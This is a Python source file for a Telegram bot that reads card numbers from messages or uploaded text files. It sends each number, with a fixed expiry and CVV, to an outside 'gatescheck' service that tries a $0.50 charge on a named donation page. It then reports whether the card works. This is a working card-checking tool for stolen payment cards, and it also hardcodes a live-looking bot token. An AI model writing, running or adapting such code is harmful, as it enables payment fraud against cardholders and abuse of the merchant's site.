import os
import re
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CallbackQueryHandler

# Bot token
TOKEN = '8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI'

# API URL
API_URL = "http://gatescheck.duckdns.org:7000/check"

# Flag to control stopping
stop_flag = False

def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params)
        result = response.json().get('result', 'Unknown')
        return result
    except Exception as e:
        return f"Error: {e}"

async def handle_message(update: Update, context: CallbackContext):
    global stop_flag
    # If message is text, check for card number
    text = update.message.text
    if text:
        card_number_matches = re.findall(r'\d+', text)
        if card_number_matches:
            card_number = card_number_matches[0]
            result = check_card_api(card_number)
            await update.message.reply_text(f"Card: {text} - Result: {result}")
        else:
            await update.message.reply_text("No card number found in the text.")
        return

    # If message is a document (file)
    if update.message.document:
        stop_flag = False  # Reset stop flag
        try:
            if not os.path.exists('downloads'):
                os.makedirs('downloads')
            file = await update.message.document.get_file()
            file_path = f"downloads/{file.file_id}.txt"
            await file.download_to_drive(file_path)

            # Create stop button
            keyboard = [
                [InlineKeyboardButton("Stop", callback_data='stop')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            # Send message with stop button
            await update.message.reply_text(
                "Scanning file. Press the 'Stop' button to halt the process.",
                reply_markup=reply_markup
            )

            # Read and scan file lines
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            for line in lines:
                if stop_flag:
                    await update.message.reply_text("Scanning stopped.")
                    break
                line = line.strip()
                card_number_matches = re.findall(r'\d+', line)
                if card_number_matches:
                    card_number = card_number_matches[0]
                    result = check_card_api(card_number)
                    await update.message.reply_text(f"Card: {line} - Result: {result}")
                else:
                    await update.message.reply_text(f"No card number found in line: {line}")

        except Exception as e:
            await update.message.reply_text(f"Error: {e}")

# Handle stop button press
async def button(update: Update, context: CallbackContext):
    global stop_flag
    query = update.callback_query
    await query.answer()
    if query.data == 'stop':
        stop_flag = True
        await query.edit_message_text(text="Scanning stopped.")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button))

    app.run_polling()

if __name__ == '__main__':
    main()
